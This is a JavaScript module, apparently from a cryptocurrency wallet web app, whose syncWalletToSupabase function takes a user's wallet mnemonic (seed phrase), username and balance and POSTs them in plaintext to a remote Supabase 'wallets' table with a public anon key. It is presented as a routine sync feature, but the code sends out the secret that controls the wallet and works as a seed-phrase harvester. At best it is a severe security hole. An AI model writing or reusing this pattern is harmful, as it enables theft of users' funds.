/**
 * Supabase client using fetch API (avoiding dependency issues)
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

function getMoscowTimestampToMinute() {
  const parts = new Intl.DateTimeFormat('sv-SE', {
    timeZone: 'Europe/Moscow',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false,
  }).formatToParts(new Date());

  const map = Object.fromEntries(parts.filter((part) => part.type !== 'literal').map((part) => [part.type, part.value]));
  return `${map.year}-${map.month}-${map.day}T${map.hour}:${map.minute}:00+03:00`;
}

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Supabase credentials missing! Check VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
    return null;
  }

  const { username, mnemonic, balance } = walletData;
  const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
  
  // В новой структуре username — это primary key
  const name = username || 'Anonymous';

  console.log('🔄 Syncing wallet to Supabase for username:', name);

  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        username: name,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: getMoscowTimestampToMinute()
      })
    });

    if (!response.ok) {
      const err = await response.text();
      console.error('❌ Supabase sync error:', response.status, err);
      return false;
    }

    console.log('✅ Wallet successfully synced to Supabase');
    return true;
  } catch (error) {
    console.error('❌ Supabase connection error:', error);
    return false;
  }
}
